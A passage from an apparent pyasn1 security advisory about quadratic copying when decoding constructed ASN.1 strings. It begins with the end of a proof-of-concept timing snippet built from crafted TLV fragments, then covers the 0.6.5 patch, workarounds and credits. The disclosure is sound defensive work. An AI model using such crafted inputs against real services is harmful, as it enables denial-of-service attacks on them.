der.decode,         tlv(0x24, octet_fragments), univ.OctetString()) measure("DER UTF8String without schema", der.decode,         tlv(0x2c, utf8_fragments)) ```  ## Patch  pyasn1 0.6.5 replaces the growing `bytes` accumulator with a list of fragments and joins them once after decoding in all three affected loops. The OCTET STRING base-class change also covers the inheriting character-string decoders. This removes the repeated copying while preserving the assembled decoded value.  ## Workaround  Until upgrading, enforce application-appropriate limits on the size of untrusted ASN.1 input *before* passing it to pyasn1, and limit the CPU resources available to decoding workers. Applications that require DER can also reject constructed string encodings before invoking the decoder. The appropriate byte limit depends on the protocol and expected valid values.  ## Credits and references  Reported by [alimony](https://github.com/alimony). Independently reported by [manus-pi](https://github.com/manus-pi), whose report identified the schema-driven DER route, inherited character-string decoders, and additional performance evidence.  - [pyasn1 v0.6.4 affected decoder source](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py) - [ITU-T X.690, CER and DER string-encoding rules](https://www.itu.int/rec/T-REC-X.690-202102-I/en) - [CVE-2026-59885, separate OID decoder issue](https://github.com/advisories/GHSA-8ppf-4f7h-5ppj)
